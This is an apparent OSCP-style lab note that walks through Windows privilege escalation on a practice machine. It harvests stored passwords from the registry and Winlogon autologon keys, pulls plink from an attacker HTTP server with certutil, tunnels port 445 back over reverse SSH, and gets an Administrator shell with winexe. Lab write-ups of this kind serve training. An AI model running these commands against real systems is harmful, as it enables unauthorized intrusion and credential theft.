
## Excalation using Stored Password
```sh
# In Victim machine after gained low level user privilege.
C:\Windows/System32>
# Check System Info of the victim machine
> sysinfo

# Check as whom we logged in to the machine
> whoami
> 
# Check all the users in the machine
> net user

# We are logged in as a low level user alfred.
# Check the permissions and groups or the user. Check if user belong to admin group
> net user <username: alfred>

# Check if the machine got multiple NICs
> ipconfig

# check network status
> netstat -ano

# NB: Follow the sushant checklist and follow more

# Check arp table
> arp -a

# Search for password in registry
> reg query HKLM /f password /t REG_SZ /s
# Passwords will be in the output somewhere. check withyour keen eyes.
# Hint: Welcome! in sample machine

# Windows autologin
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# we got username and password from this. but we had nowhere to login using this creds.


# In the sample machine, it has been found that port 445 is open locally but not publicly. So we should try to port forward it using plink to attacker machine.

# In Attacker machine

# get putty plink form https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
# Save the 32 bit file from the site and open a python server to share the file to victim machine.

> python -m SimpleHTTPServer 80
# server started.

# In Victim machine
# Download the plink file to victim machine using certutil.exe

> cd c:\user\alfred
> certutil.exe -urlcache -f http://<ip address of attacker machine>/<source plink file name: plink.exe> <destination filename: plink.exe>
# file downloaded

# In Attacker machine
# we should have ssh server in the machine. if not, install ssh
> sudo apt install ssh

# we have to make a modification in ssh config
> sudo vim /etc/ssh/sshd-config
# in the file, under authentication section, modify
From "# PermitRootLogin prohibit-password" to "PermitRootLogin yes"
# save file after mofify and restart ssh service

> sudo service ssh restart

# In Victim Machine

> plink.exe -l <attacker username: root> -p <Attackerpassword: toor> -R 445:127.0.0.1:445 <Attacker IP Address>

# might have to hit enter couple of times

# and we are now the attacker machine in victim machine
root@kali> 
# to check the portforward status
> netstat -ano
# portforward successfull

# we will use winexe for login to administrator account 
# winexe is a linux based applicaion which helps us execute commands in a windows system
> winexe -U <AnyAdminUsernameinVictimmachine%PasswordofUser> //127.0.0.1 "<command to execute>" 
# winexe -U Administrator%Welcome! //127.0.0.1 "cmd.exe"
# This tool is slow. so might have to hit enter couple of times.

# We got a shell now
> whoami
# is chatterbox/Administrator

# If we want an improved shell wihtout too much lag. upload a netcat file from attacker machine and download it using certutil in victim machine and pop a shell with it.


 



```

Reference: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html